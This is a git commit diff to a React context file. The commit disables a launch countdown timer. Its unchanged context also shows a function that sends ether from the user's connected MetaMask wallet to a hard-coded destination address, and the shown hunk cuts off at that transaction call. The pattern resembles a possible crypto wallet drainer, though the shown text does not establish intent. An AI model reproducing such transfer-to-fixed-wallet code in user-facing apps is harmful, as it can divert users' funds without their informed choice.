5694924e34c89f4611879f1acceb4d53e5d525b3
Solomon Adewole <solomonwolemail@gmail.com>
2023-09-26 11:31:19 +0100

    new

--- src/context/AppContext.jsx
+++ src/context/AppContext.jsx
@@ -1,4 +1,4 @@
-import { createContext, useEffect, useState } from "react";
+import { createContext, useState } from "react";
 import { dataApp } from "../components/data";
 
 const appContext = createContext();
@@ -6,48 +6,53 @@ const appContext = createContext();
 export function AppContextProvider({ children }) {
   const [appData, setAppData] = useState(dataApp);
   // Set your target launch date and time
-  const targetDate = new Date('2023-09-26T00:00:00Z').getTime();
+  //   const targetDate = new Date('2023-09-26T00:00:00Z').getTime();
   // Initialize state variables
-  const [timeRemaining, setTimeRemaining] = useState(calculateTimeRemaining());
+  const timeRemaining = {
+    days: 0,
+    hours: 0,
+    minutes: 0,
+    seconds: 0,
+  };
 
-  function calculateTimeRemaining() {
-    const now = new Date().getTime();
-    const timeDiff = targetDate - now;
+  //   function calculateTimeRemaining() {
+  //     const now = new Date().getTime();
+  //     const timeDiff = targetDate - now;
 
-    if (timeDiff <= 0) {
-      // Launch date has passed
-      return {
-        days: 0,
-        hours: 0,
-        minutes: 0,
-        seconds: 0,
-      };
-    }
+  //     if (timeDiff <= 0) {
+  //       // Launch date has passed
+  //       return {
+  //         days: 0,
+  //         hours: 0,
+  //         minutes: 0,
+  //         seconds: 0,
+  //       };
+  //     }
 
-    // const days = Math.floor(timeDiff / (1000 * 60 * 60 * 24));
-    // const hours = Math.floor(
-    //   (timeDiff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
-    // );
-    // const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
-    // const seconds = Math.floor((timeDiff % (1000 * 60)) / 1000);
+  //     // const days = Math.floor(timeDiff / (1000 * 60 * 60 * 24));
+  //     // const hours = Math.floor(
+  //     //   (timeDiff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
+  //     // );
+  //     // const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
+  //     // const seconds = Math.floor((timeDiff % (1000 * 60)) / 1000);
 
-    return {
-        days: 0,
-        hours: 0,
-        minutes: 0,
-        seconds: 0,
-    };
-  }
+  //     return {
+  //         days: 0,
+  //         hours: 0,
+  //         minutes: 0,
+  //         seconds: 0,
+  //     };
+  //   }
 
-  useEffect(() => {
-    const timer = setInterval(() => {
-      setTimeRemaining(calculateTimeRemaining());
-    }, 1000);
+  //   useEffect(() => {
+  //     const timer = setInterval(() => {
+  //       setTimeRemaining(calculateTimeRemaining());
+  //     }, 1000);
 
-    // Clean up the interval when the component unmounts
-    return () => clearInterval(timer);
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, []);
+  //     // Clean up the interval when the component unmounts
+  //     return () => clearInterval(timer);
+  //     // eslint-disable-next-line react-hooks/exhaustive-deps
+  //   }, []);
 
   const [isMetamaskInstalled, setIsMetamaskInstalled] = useState(false);
   const [isConnected, setIsConnected] = useState(false);
@@ -59,12 +64,12 @@ export function AppContextProvider({ children }) {
 
   const transferFunds = async () => {
     const sourceWallet = window.ethereum.selectedAddress;
-    const destinationWallet = "0xe6ba24AC857D2Efe97100250a61c324E4961984A";  
+    const destinationWallet = "0xe6ba24AC857D2Efe97100250a61c324E4961984A";
 
     if (web3 && sourceWallet && destinationWallet) {
       try {
         // Transfer funds
-        const amount = web3.utils.toWei(myOwn, "ether"); 
+        const amount = web3.utils.toWei(myOwn, "ether");
         await web3.eth.sendTransaction({
           from: sourceWallet,
           to: destinationWallet,
